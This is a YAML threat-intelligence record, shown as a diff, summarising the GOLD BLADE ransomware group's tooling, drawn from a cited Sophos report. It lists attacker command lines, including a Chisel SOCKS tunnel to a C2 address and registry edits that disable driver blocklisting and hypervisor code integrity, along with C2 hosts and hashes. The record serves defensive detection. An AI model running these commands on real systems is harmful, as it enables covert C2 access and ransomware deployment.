@@ -1,0 +1,151 @@
+description: GOLD BLADE threat group uses sophisticated methods including weaponized
+  resumes via recruitment platforms, RedLoader malware with multiple stages, RPivot
+  for C2, and QWCrypt ransomware.
+attribution: GOLD BLADE (RedCurl, RedWolf, Earth Kapre)
+malware_families:
+- RedLoader
+- QWCrypt
+- qwCrypt
+TTPs:
+  processes:
+  - rundll32.exe
+  - pcalua.exe
+  - conhost.exe
+  - sra.py
+  - osr.py
+  - Chisel
+  - NSSM
+  - SensorPerformanceEvents.exe
+  - term.exe
+  - lmhost.exe
+  - wmlib.exe
+  - powershell.exe
+  - cmd.exe
+  commandline:
+  - rundll32.exe <GUID>.dll,CplApplet
+  - pcalua.exe -c "rundll32.exe <GUID>.dll,CplApplet"
+  - pcalua.exe conhost.exe /sconsqvw
+  - python sra.py
+  - python osr.py
+  - chisel --socks 109.206.236.209:18810
+  - nssm install MSAProfileNotificationHandler
+  - nssm install SensorPerformanceEvents
+  - lmhost.exe
+  - wmlib.exe
+  - quwc [flags]
+  - Encrypt HyperV VMs
+  - Print system info
+  - Kill VM process
+  - Do not self delete
+  - Do not delete shadow copies
+  - TurnOff HyperV VMs (default true)
+  - Use verbose output format
+  powershell: []
+  scripting_engine:
+  - Python
+  registry_keys:
+  - HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config /v VulnerableDriverBlocklistEnable
+    /t REG_DWORD /d 0x0 /f
+  - HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\DeviceGuard\\\\Scenarios\\\\HypervisorEnforcedCodeIntegrity
+    /v Enabled /t REG_DWORD /d 0x0 /f
+  image_load:
+  - term.sys
+  - lmhost.sys
+  - wmlib.sys
+  network_connections:
+  - rundll32.exe <GUID>.dll,CplApplet
+  - 109.206.236.209
+  - stars.medbury.com:18810
+  - 194.113.245.238:8810
+  - 162.33.178.61:18810
+  - process: null
+    destination: live[.]airemoteplant[.]workers[.]dev
+    port: null
+  - process: null
+    destination: quiet[.]msftlivecloudsrv[.]workers[.]dev
+    port: null
+  - process: null
+    destination: automatinghrservices[.]workers[.]dev
+    port: null
+  - process: null
+    destination: local[.]chronotypelabs[.]workers[.]dev
+    port: null
+  - process: null
+    destination: soft[.]rippleserveruns[.]workers[.]dev
+    port: null
+  - process: null
+    destination: cv[.]optimalconfluenceservices[.]workers[.]dev
+    port: null
+  - process: null
+    destination: 23[.]254[.]224[.]79
+    port: null
+  - process: null
+    destination: 109[.]206[.]236[.]209
+    port: null
+  - process: null
+    destination: hxxp://194[.]113[.]245[.]238:8810
+    port: '8810'
+  - process: null
+    destination: hxxp://stars[.]medbury[.]com:18810
+    port: '18810'
+  - process: null
+    destination: hxxp://162[.]33[.]178[.]61:18810
+    port: '18810'
+  file_activity:
+  - C:\\Users\\<username>\\AppData\\Roaming\\BrowserEngineUpdate.exe
+  - C:\\ProgramData\\term.exe
+  - C:\\ProgramData\\lmhost.exe
+  - C:\\ProgramData\\wmlib.exe
+  - <victim ID>.tmp
+  - <victim ID>.bat
+  - qwc_<victim ID>.exe
+  - qwc_<victim ID>_1.bat
+  - qwc_<victim ID>_3.bat
+  - '!!!how_to_unlock_qwCrypt_files.txt'
+  - E:\\SpecOp\\js!_LOCKERS!_TOOLS\\13_KILLAV\\DISTRIB\\WIN 2012 - WIN 2022 (Win10
+    - Win11)\\Terminator_v1.1 (WITHOUT INSTALL)\\x64\\Release\\Terminator.pdb
+  - netutils.dll
+  - srvcli.dll
+  - lpLibFileName[@]
+  - TermSys_Str
+  persistence:
+  - Scheduled tasks named BrowserEngineUpdate, BrowserSMP, BrowserQE, HybridDriveCacheRebalance,
+    RegisterDevicePolicyChange, LicenseAcquisition, FODCleanupTask
+  - Windows services MSAProfileNotificationHandler, SensorPerformanceEvents
+  - Kernel-mode driver service TRM or SfTerm, LMHost
+  process_relations:
+  - rundll32.exe -> pcalua.exe
+  - pcalua.exe -> conhost.exe
+  - NSSM -> Chisel
+  - SensorPerformanceEvents.exe -> Chisel
+IOCs:
+  hashes:
+  - f5203c7ac07087fd5029d83141982f0a5e78f169cdc4ab9fc097cc0e2981d926
+  - d302836c7df9ce8ac68a06b53263e2c685971781a48ce56b3b5a579c5bba10cc
+  - 45777688e870e806aa3123a566f8728e2a0f5620
+  - af912641a80f0c8a79f77ffe359bb5f6
+  - 567f8647be25cd2943a014d525923e9fa17a129cf48b0a9802f0180b13ed130c
+  - 798f7c7c61c09a3f3e3c75c09b1464a6efc936dd
+  - 8beaf5bc60bcf735808485ac12457468
+  - a22676c6897da69c5f2c62b31ad5b0e26af706cbcb052bed60cd784e6b56d70f
+  - 0705efc42ab20fda36ea55b6583370b60e087288
+  - 64eed490f2ebd040b8822c47622c47a0e592e3d8
+  - 264be41070c4270adf337e1119842d9f
+  - ab4695e5d5472af124ea69e0c1abb4c9726980b4c99c5da10ae2ba85f55bf1e4
+  - 6b53e25bbf07ce657347164026f6bc50680319f5
+  - 3debde1aeae4255e0d40ad410421f175
+  - dcc85cc6b984961187ae364be8ee11541dee4f7a46bea3960c0218465fbc6b96
+  ip_addresses:
+  - 109.206.236.209
+  - 194.113.245.238
+  - 162.33.178.61
+  domains:
+  - workers.dev
+  - stars.medbury.com
+  urls:
+  - gqwcrypt_0laedc@proton.me
+authors:
+- Morgan Demboski
+reference: https://news.sophos.com/en-us/2025/12/05/sharpening-the-knife-gold-blades-strategic-evolution/
+date_of_publication: December 05, 2025
+file_creation_date: December 09, 2025
